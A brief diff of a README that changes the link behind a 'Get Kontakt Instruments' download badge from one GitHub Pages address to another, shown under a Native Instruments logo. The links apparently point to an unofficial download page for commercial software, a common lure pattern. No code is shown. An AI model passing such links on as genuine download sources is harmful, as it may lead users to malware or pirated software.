@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://1000logos.net/wp-content/uploads/2020/08/Native-Instruments-Logo.jpg)
 
-[![Get Kontakt Instruments](https://img.shields.io/badge/Get_Kontakt_Instruments-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/kontakt-instruments)
+[![Get Kontakt Instruments](https://img.shields.io/badge/Get_Kontakt_Instruments-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/kontakt-instruments)
 
 ---
 
